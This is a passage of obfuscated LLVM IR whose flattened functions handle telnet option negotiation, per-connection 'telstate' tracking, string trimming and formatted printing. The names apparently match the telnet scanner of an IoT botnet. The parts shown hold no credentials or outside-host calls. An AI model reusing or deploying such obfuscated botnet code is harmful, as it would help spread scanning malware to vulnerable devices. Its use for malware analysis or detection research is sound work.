  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  store i32 %25, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1601485077, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1601485077, label %first
    i32 247906471, label %28
    i32 538691934, label %32
    i32 1981379383, label %38
    i32 1367307778, label %39
    i32 -896154923, label %40
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %26 = icmp eq i32 %.reload, 255
  %27 = select i1 %26, i32 247906471, i32 538691934
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  %29 = load i32, i32* %7, align 4
  %30 = load i8*, i8** %9, align 8
  %31 = call i32 @negotiate(i32 %29, i8* %30, i32 3)
  store i32 538691934, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i8*, i8** %9, align 8
  %34 = load i8**, i8*** %11, align 8
  %35 = call i32 @contains_string(i8* %33, i8** %34)
  %36 = icmp ne i32 %35, 0
  %37 = select i1 %36, i32 1981379383, i32 1367307778
  store i32 %37, i32* %switchVar
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  store i32 1, i32* %6, align 4
  store i32 -896154923, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 0, i32* %6, align 4
  store i32 -896154923, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %6, align 4
  ret i32 %41

loopEnd:                                          ; preds = %39, %38, %32, %28, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1316989674, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1316989674, label %NodeBlock
    i32 184892527, label %LeafBlock1
    i32 -1767910427, label %LeafBlock
    i32 -1292014724, label %16
    i32 -1473095775, label %17
    i32 948708340, label %26
    i32 -245978057, label %27
    i32 253065294, label %34
    i32 -1419872543, label %35
    i32 595879410, label %42
    i32 -1181254076, label %50
    i32 713278678, label %58
    i32 85671616, label %59
    i32 -577725904, label %60
    i32 -885368768, label %NewDefault
    i32 137233614, label %67
    i32 -1258302276, label %68
    i32 -1304527166, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 -1767910427, i32 184892527
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -1292014724, i32 -885368768
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 -1473095775, i32 -885368768
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1304527166, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 948708340, i32 -245978057
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 -577725904, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 253065294, i32 -1419872543
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 85671616, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 595879410, i32 -1181254076
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 713278678, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 713278678, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 85671616, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -577725904, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 -1258302276, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 137233614, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 -1258302276, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 -1304527166, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -305149284, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -305149284, label %first
    i32 -2102847081, label %8
    i32 1580083534, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 -2102847081, i32 1580083534
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 1580083534, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim2(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -514539388, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -514539388, label %10
    i32 -2039984460, label %20
    i32 -1009745835, label %23
    i32 1827251091, label %24
    i32 -121406777, label %29
    i32 1465596063, label %38
    i32 -1166682251, label %40
    i32 -2100294691, label %43
    i32 -643881921, label %45
    i32 -1083331936, label %50
    i32 1647553466, label %62
    i32 534939854, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 -2039984460, i32 -1009745835
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -514539388, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 1827251091, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -121406777, i32 1465596063
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #9
  %37 = icmp ne i32 %36, 0
  store i32 1465596063, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 -1166682251, i32 -2100294691
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 1827251091, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -643881921, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -1083331936, i32 534939854
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 1647553466, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -643881921, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 -386197202, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -386197202, label %12
    i32 1270475999, label %18
    i32 -1400933435, label %24
    i32 2138011905, label %32
    i32 602157141, label %33
    i32 -1034664843, label %39
    i32 1985227144, label %40
    i32 -105286814, label %46
    i32 -324470454, label %49
    i32 797114950, label %50
    i32 649971428, label %56
    i32 -1430981242, label %61
    i32 664303732, label %62
    i32 1742263826, label %68
    i32 -48216598, label %73
    i32 802314541, label %75
    i32 501861771, label %84
    i32 2030641934, label %87
    i32 -1131250661, label %93
    i32 -1165757911, label %99
    i32 -88647619, label %105
    i32 -1828144219, label %110
    i32 -1257026343, label %118
    i32 1203686503, label %120
    i32 1520272934, label %121
    i32 -1842776769, label %127
    i32 1164080783, label %133
    i32 190883546, label %140
    i32 418730908, label %146
    i32 1732682033, label %151
    i32 1018476876, label %158
    i32 824794622, label %164
    i32 -823058086, label %171
    i32 -1055915790, label %177
    i32 -1278001543, label %182
    i32 -1443294493, label %189
    i32 -427991795, label %195
    i32 472958543, label %202
    i32 -403424570, label %208
    i32 1473572641, label %213
    i32 1743290798, label %220
    i32 801277721, label %226
    i32 -1937536784, label %233
    i32 -1884146594, label %239
    i32 1010647730, label %244
    i32 -887192635, label %251
    i32 -381956903, label %257
    i32 -1292166376, label %263
    i32 -2073301962, label %269
    i32 -846426780, label %274
    i32 920282744, label %286
    i32 -1543679255, label %287
    i32 -1204737582, label %288
    i32 845219274, label %295
    i32 320171362, label %296
    i32 324225343, label %299
    i32 1646129641, label %303
    i32 925606112, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 1270475999, i32 324225343
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1400933435, i32 -1543679255
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 2138011905, i32 602157141
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 324225343, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1034664843, i32 1985227144
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -1204737582, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 -105286814, i32 -324470454
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -324470454, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 797114950, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 649971428, i32 -1430981242
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 797114950, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 664303732, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 1742263826, i32 -48216598
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 -48216598, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 802314541, i32 2030641934
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 501861771, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 664303732, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 -1131250661, i32 -1842776769
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 -1165757911, i32 -88647619
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 -1828144219, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 -1828144219, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 -1257026343, i32 1203686503
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 1520272934, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1520272934, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.327, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
